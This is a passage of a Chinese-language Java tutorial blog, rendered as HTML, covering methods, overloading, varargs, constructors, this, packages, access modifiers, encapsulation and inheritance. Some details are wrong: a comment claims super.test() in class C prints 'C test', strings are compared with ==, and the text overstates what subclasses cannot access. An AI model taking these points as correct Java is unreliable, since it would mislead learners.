方法名（形参列表）&#123;<br>语句；<br>...<br><span class="hljs-keyword">return</span> 返回值；<br>&#125;<br>e.<span class="hljs-property">g</span>.<br><span class="hljs-built_in">void</span> <span class="hljs-title function_">butt3rf1y</span>(<span class="hljs-params"></span>)&#123;...&#125;<br><span class="hljs-comment">//可以类比C语言的函数定义</span><br><br>类内部调用<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br> <span class="hljs-title function_">test</span>();<br> &#125;<br><span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br><br>类外部调用<br><span class="hljs-title class_">Main</span>.<span class="hljs-property">java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br><span class="hljs-title class_">Cat</span> cat=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br> cat.<span class="hljs-title function_">miao</span>();<br> &#125;<br>&#125;<br><span class="hljs-title class_">Cat</span>.<span class="hljs-property">java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-built_in">void</span> <span class="hljs-title function_">miao</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;喵&quot;</span>);<br>        <span class="hljs-keyword">return</span>；（可以省略）<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>一个方法只能返回一个值，要返回多个值可以用数组，可以为任意类型，包括基本数据类型和引用类型，<strong>返回值类型必须和 return 的值类型一致或兼容</strong></p><p>当函数没有返回值时，return 可以省略</p><h3 id="参数（类比C语言）"><a href="#参数（类比C语言）" class="headerlink" title="参数（类比C语言）"></a>参数（类比C语言）</h3><p>一个方法可以没有参数或多个参数，中间用逗号隔开（类比C语言）</p><h3 id="方法体"><a href="#方法体" class="headerlink" title="方法体"></a>方法体</h3><p>类比C语言函数体</p><p><strong>不可以在方法体内部定义方法</strong></p><h3 id="方法传参机制"><a href="#方法传参机制" class="headerlink" title="方法传参机制"></a>方法传参机制</h3><p><strong>a.方法嵌套顺序</strong></p><p>执行方法时会独立开辟栈空间,执行完毕或执行到 return 时，就会返回到调用方法的地方，返回后继续执行后面的代码，main 方法执行完毕，程序结束</p><p><strong>b.值传递&#x2F;值拷贝，形参任何改变不影响实参</strong></p><p><strong>c.引用传递，传递地址，形参改变可能影响实参</strong></p><p><strong>d.String 的传递</strong></p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性（成员变量&#x2F;字段&#x2F; field ）的概念</p><p>属性定义语法与变量一致，多了访问修饰符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">访问修饰符 属性类型 属性名<br></code></pre></td></tr></table></figure><p>属性类型可以为任意类型，可以是基本数据类型和引用类型，如果没有初始化，有默认值，和数组一致</p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h3><h4 id="静态属性（类属性）与实例属性（对象属性）"><a href="#静态属性（类属性）与实例属性（对象属性）" class="headerlink" title="静态属性（类属性）与实例属性（对象属性）"></a>静态属性（类属性）与实例属性（对象属性）</h4><p>静态属性，只有一份，可以通过 <strong>类名.属性名&#x2F;对象.属性名</strong>来赋值和访问</p><p>实例属性，每个对象有一份，只能通过 <strong>对象.属性名</strong>来赋值和访问</p><h4 id="静态方法和实例方法（对象方法）"><a href="#静态方法和实例方法（对象方法）" class="headerlink" title="静态方法和实例方法（对象方法）"></a>静态方法和实例方法（对象方法）</h4><p>静态方法只能调用静态方法，不能访问实例属性</p><p>实例方法中可以调用静态方法和实例方法，也可以访问静态属性和实例属性</p><h4 id="补全method方法"><a href="#补全method方法" class="headerlink" title="补全method方法"></a>补全method方法</h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">System.out.println(<span class="hljs-keyword">method</span><span class="hljs-params">(<span class="hljs-keyword">method</span>(100.2,1.0)</span>,100))<br><br><span class="hljs-title function_">static</span> <span class="hljs-title function_">double</span> <span class="hljs-title function_">method</span><span class="hljs-params">(double a,double b)</span><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  return a+b;</span><br><span class="hljs-comment"> &#125;</span><br></code></pre></td></tr></table></figure><p>e.g.</p><p>定义一个find方法，实现对字符串数组元素进行查找，并返回索引，找不到返回-1；</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">String</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>&#125;;<br>  <span class="hljs-type">String</span> b=<span class="hljs-string">&quot;c&quot;</span>;<br>  System.out.<span class="hljs-built_in">println</span>(<span class="hljs-built_in">find</span>(a,b));<br>  <br> &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">String</span>[] a,<span class="hljs-type">String</span> b)</span> </span>&#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] == b) &#123;<br>          <span class="hljs-keyword">return</span> i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型，参数顺序不同即可，<strong>与返回值类型无关</strong>，只看参数列表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Hello &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span>&#123;<br>       <br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;abc0&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&#x27;a&#x27;</span>);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">false</span>);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-number">1000.1</span>);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-number">123</span>);<br>        test(&quot;x&quot;);<br>    &#125;<br>    static <span class="hljs-type">void</span> test(String a)&#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br>    &#125;<br>    static <span class="hljs-type">void</span> test(<span class="hljs-type">int</span> a)&#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span></span>&#123; &#125;<br></code></pre></td></tr></table></figure><p>可变参数本质就是数组，实参可以为0个或任意多个</p><p>可变参数的实参可以为数组，这时候只能传一个参数</p><p>形参列表中只能出现一个可变参数</p><p>可变参数可以和普通参数以前放在形参列表，但必须保证可变参数在最后一个西餐列表中只能出现一个可变参数</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception</span>&#123;<br>       <br>       <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-built_in">sum</span>(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;cpp&quot;</span>,a));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">String</span> d,<span class="hljs-type">String</span> b,<span class="hljs-type">int</span>... a)</span></span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++)&#123;<br>            result+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="构造器-构造方法-构造函数"><a href="#构造器-构造方法-构造函数" class="headerlink" title="构造器&#x2F;构造方法&#x2F;构造函数"></a>构造器&#x2F;构造方法&#x2F;构造函数</h1><h2 id="构造器特点"><a href="#构造器特点" class="headerlink" title="构造器特点"></a>构造器特点</h2><p>与类名一致，<strong>无返回值</strong>；</p><p>当对象创建时，会自动调用对应的构造器</p><p>如果没有定义构造器，会自动生成默认的无参构造器（默认构造器）</p><p>一个类可以定义多个不同的构造器，即构造器重载</p><p>一旦定义了构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非自己显示的定义一下</p><h2 id="对象创建流程"><a href="#对象创建流程" class="headerlink" title="对象创建流程"></a>对象创建流程</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>       <span class="hljs-keyword">int</span> age=<span class="hljs-number">90</span>;<br>       String name;<br>       Person(String n,<span class="hljs-keyword">int</span> a)&#123;<br>           name=n;<br>           age=a;<br>       &#125;<br>   &#125;<br>   Person p=new Person(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">31</span>);<br></code></pre></td></tr></table></figure><p>加载 Person 类信息，只会加载一次</p><p>在堆中分配空间（地址）</p><p>完成对象初始化</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">默认初始化   <span class="hljs-attribute">age</span>=0   <span class="hljs-attribute">name</span>=<span class="hljs-literal">null</span><br>显示初始化   <span class="hljs-attribute">age</span>=90   <span class="hljs-attribute">name</span>=<span class="hljs-literal">null</span><br>构造器初始化   <span class="hljs-attribute">age</span>=31   <span class="hljs-attribute">name</span>=abc<br></code></pre></td></tr></table></figure><p>在对象在堆中的地址，返回给 p (p是对象名，也可以理解成是对象的引用)</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>属性（成员变量），可以被本类或其他类使用</p><p>可以加访问修饰符</p><p>有默认值，可以不赋值直接使用</p><p>生命周期长，伴随着对象的创建而创建，销毁而销毁</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>不可加修饰符</p><p>没有默认值，需要赋值使用</p><p>生命周期短，伴随代码块执行而创建，结束而销毁</p><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p><strong>static静态代码块（最先执行）</strong>、构造代码块、方法代码块、局部代码块、语句代码块</p><p><strong>属性和局部变量可以重名</strong>，优先使用局部变量，在<strong>同一个作用域中两个局部变量不能重名</strong></p><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><ul><li><p>代表当前对象，打印对象的 hashCode，哪个对象调用方法，this 就指哪个对象</p></li><li><p>this 用于区分当前对象的属性和局部变量</p></li><li><p>this 不能在类外部使用，<strong>只能在类内部实例方法中使用</strong>，静态方法不可使用</p></li><li><p>类内部赋值和获取实例属性</p></li></ul><h2 id="类内部调用方法"><a href="#类内部调用方法" class="headerlink" title="类内部调用方法"></a>类内部调用方法</h2><p>方法名（实参列表）</p><p>​this.方法名（实参列表）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span>()</span>&#123;<br>      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-keyword">this</span>.hashCode());<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test1</span>()</span>&#123;<br>      <span class="hljs-keyword">this</span>.test();<br>      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-keyword">this</span>.hashCode());<br>  &#125;<br> <br></code></pre></td></tr></table></figure><h2 id="this方法"><a href="#this方法" class="headerlink" title="this方法"></a>this方法</h2><p>this（实参列表）</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> Cat(String name)&#123;<br>       <span class="hljs-keyword">this</span>(name,<span class="hljs-number">30</span>);<span class="hljs-comment">//必须放在第一行才能使用</span><br>       <span class="hljs-keyword">this</span>.name=name;<br>       System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">this</span>.name);<br>       System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;this&quot;</span>+<span class="hljs-keyword">this</span>.hashCode());<br>   &#125;<br>   <span class="hljs-keyword">public</span> Cat(String dname,int age)&#123;<br>       <span class="hljs-keyword">this</span>.age=age;<br>       System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Cat(String dname,int agr)&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>区分相同名字类，方便管理，控制访问范围</p><h2 id="建包"><a href="#建包" class="headerlink" title="建包"></a>建包</h2><p>建立不同的文件夹&#x2F;目录来保存类文件</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>基本语法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package com<span class="hljs-selector-class">.butterfly</span><span class="hljs-selector-class">.app</span><br>package <span class="hljs-comment">//关键字</span><br>com<span class="hljs-selector-class">.butterfly</span><span class="hljs-selector-class">.app</span> <span class="hljs-comment">//包名</span><br></code></pre></td></tr></table></figure><p>package 的作用是声明当前类所在的包，<strong>一个类只能有一个 package</strong></p><h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>import 指令位置放在 package 下，在类定义前面，可以有多句且没有顺序要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br>java.lang.*  是基本包，默认引入，不需要再引入<br></code></pre></td></tr></table></figure><h1 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h1><p>控制属性和方法的访问权限</p><p>修饰类的属性，成员方法及类</p><p>只有默认的和 public 才能修饰类，并且遵循上述访问权限的特点</p><table><thead><tr><th></th><th>本类</th><th>同包</th><th>子类</th><th>不同包</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>没有修饰符</td><td>√</td><td>√</td><td>×</td><td>×</td></tr></tbody></table><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>把属性私有，定义公开的 get、set 方法来验证数据合理性</p><p>e.g</p><p>定义 Account 类，要求具有属性：姓名 name（长度为2-4，初始化后不可修改）、余额 balance（必须大于20）、密码 password（必须是六位）。如果不满足，则给出提示信息，并给默认值</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Account.java<br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Account &#123;<br>    private String <span class="hljs-type">name</span>=<span class="hljs-keyword">null</span>;<br>    private <span class="hljs-type">double</span> balance=<span class="hljs-number">0</span>;<br>    private String <span class="hljs-keyword">password</span>=<span class="hljs-keyword">null</span>;<br>    <br>    <span class="hljs-built_in">public</span> String getName() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">name</span>;<br>    &#125;<br>    <br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setName(String <span class="hljs-type">name</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-type">name</span>==<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;名字不能设置为null&quot;);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(this.name!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;名字只能修改一次&quot;);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-type">name</span>.length() &lt; <span class="hljs-number">2</span> || <span class="hljs-type">name</span>.length() &gt; <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;名字长度需要2-4位&quot;);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                this.name = <span class="hljs-type">name</span>;<br>            &#125;<br>        &#125;<br>       <br>    &#125;<br>    <br>    <span class="hljs-built_in">public</span> <span class="hljs-type">double</span> getBalance() &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br>    <br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setBalance(<span class="hljs-type">double</span> balance) &#123;<br>        <span class="hljs-keyword">if</span>(balance&lt;=<span class="hljs-number">20</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;余额必须大于20&quot;);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            this.balance = balance;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-built_in">public</span> String getPassword() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">password</span>;<br>    &#125;<br>    <br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setPassword(String <span class="hljs-keyword">password</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">password</span>==<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;password不能设置为null&quot;);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">password</span>.length()==<span class="hljs-number">6</span>)&#123;<br>            this.<span class="hljs-keyword">password</span> = <span class="hljs-keyword">password</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;密码必须是六位&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>Hello.java<br>Account account=<span class="hljs-built_in">new</span> Account();<br>        account.setName(&quot;null&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(account.getName());<br>        account.setPassword(&quot;123456&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(account.getPassword());<br><br></code></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">子类</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">父类</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>a.     父类&#x2F;超类&#x2F;基类</p><p>​子类&#x2F;派生类</p><p>b. 多个类存在相同的属性和方法时，从中抽象出父类，在父类中定义相同的属性和方法，所有子类不需要再重新定义，只需要通过 extends 声明继承父类就行</p><p>c. 子类自动拥有父类的所有属性和方法（受访问修饰符影响）</p><p>d. 子类不能访问父类的属性和方法，可以通过父类的公开方法去访问，类似封装</p><p>e. 单继承机制，子类最多只能继承一个父类（直接继承），但是可以实现多个接口</p><p>f. 所有类都是 Object 的子类</p><p>g. 多次继承 查看方法</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>        <span class="hljs-type">String</span> name=<span class="hljs-string">&quot;AA&quot;</span>;<br>        <span class="hljs-keyword">private</span> int age=<span class="hljs-number">100</span>;<br>        public void test()&#123;<br>            <span class="hljs-type">System</span>.out.println(<span class="hljs-string">&quot;A test&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-type">String</span> name=<span class="hljs-string">&quot;BB&quot;</span>;<br>    <span class="hljs-type">String</span> java=<span class="hljs-string">&quot;java&quot;</span>;<br>    <span class="hljs-keyword">private</span> int nums=<span class="hljs-number">100</span>;<br>    public void demo()&#123;<br>        <span class="hljs-comment">//super可以访问的成员（属性和方法）</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">super</span>.name); <span class="hljs-comment">//AA</span><br>        <span class="hljs-keyword">super</span>.test();       <span class="hljs-comment">//A test</span><br>        <span class="hljs-comment">//this可以访问的成员</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">this</span>.java);  <span class="hljs-comment">//java</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">this</span>.nums);  <span class="hljs-comment">//100</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">this</span>.name);  <span class="hljs-comment">//BB</span><br>        <span class="hljs-comment">//this.demo();    //递归</span><br>        <span class="hljs-keyword">this</span>.test();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-type">String</span> name=<span class="hljs-string">&quot;CC&quot;</span>;<br>    public void test()&#123;<br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-string">&quot;C test&quot;</span>);<br>    &#125;<br>    public void show()&#123;<br>        <span class="hljs-comment">//super访问成员</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">super</span>.java); <span class="hljs-comment">//java</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">super</span>.name); <span class="hljs-comment">//BB</span><br>        <span class="hljs-keyword">super</span>.test();  <span class="hljs-comment">//C test</span><br>        <span class="hljs-keyword">super</span>.demo();<br>        <span class="hljs-comment">//this可以访问哪些成员</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">this</span>.java);  <span class="hljs-comment">//java</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-keyword">this</span>.name);  <span class="hljs-comment">//CC</span><br>        <span class="hljs-keyword">this</span>.test();    <span class="hljs-comment">//C test</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="父类构造器"><a href="#父类构造器" class="headerlink" 